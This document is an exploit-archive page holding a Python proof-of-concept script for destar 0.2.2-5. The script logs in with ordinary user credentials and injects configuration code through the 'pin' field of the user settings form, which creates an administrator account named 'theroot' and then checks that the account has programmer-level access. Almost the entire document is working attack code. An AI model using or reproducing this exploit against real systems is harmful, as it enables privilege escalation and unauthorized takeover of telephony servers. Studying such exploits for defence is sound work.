destar 0.2.2-5 Arbitrary Add Admin User Exploit
===============================================



#
#!/usr/bin/python
#
# Exploit for destar 0.2.2-5, tested on Linux Debian
#
# Bug found and  exploit coded by a non root user
# http://nonroot.blogspot.com/
#
# Enero 2008
#
# This is a PoC, please use it just for learning how to exploit something
#
# use: $python ./exploit_code.py
#
# required: urllib, sys and re
#
import urllib
import sys,re
print "Target host: i.e: http://127.0.0.1:8080/"
host=raw_input("Target host ( include http and /): ")
user=raw_input("A normal user for destar:")
password=raw_input("A normal password for destar:")
null=""
print "trying ..."
loggin = urllib.urlencode({&#039;name&#039;: user, &#039;pw&#039;: password})
attack = urllib.urlencode({&#039;cfim&#039;: null, &#039;cfbs&#039;: null, &#039;cfto&#039;: null, &#039;dsec&#039; : &#039;45&#039;, &#039;vmim&#039; : &#039;yes&#039;,&#039;vmbs&#039; : &#039;yes&#039;, &#039;vmu&#039; : &#039;yes&#039;, &#039;pin&#039; : &#039;1234,) ; CfgOptUser(name="theroot",secret="theroot",pc="200.75.43.187",phone="agent1",pbx="pbx1",level="4",language="en",) ; CfgPhoneSip(pbx="pbx1000",name="OpenBSD-Agent",secret="imsecure",ext= "2999",dtmfmode = "rfc2833",enablecallgroup = True,callgroup = "1",queues="queue1",panel= True&#039; })
response= urllib.urlopen(host+"login/", loggin)
data=response.read()
lookup=re.compile("&#039;User&#039;").search
match=lookup(data)
if match:
	print user,"logged, now trying exploit"
else:
	print "Password invalid, try again."
	sys.exit(2)

response= urllib.urlopen(host+"user/settings/", attack)

if response:
	print "ok, attack was done, now i will try loggin like &#039;theroot&#039;"
	user=&#039;theroot&#039;
	password=&#039;theroot&#039;
	loggin = urllib.urlencode({&#039;name&#039;: user, &#039;pw&#039;: password})
	response= urllib.urlopen(host+"login/", loggin)
	data=response.read()
	lookup=re.compile("&#039;Programmer&#039;").search
	match=lookup(data)
	if  match:
        	print "Exploit ok. try: ",host+"/user/info"
	else:
		print "Exploit failed, sorry, maybe you need that the sysadmin restart destar, be patient!"
		sys.exit(2)
else:
	print "Exploit failed, sorry, go and find some new bug or check this code and fix it!"
	sys.exit(2)



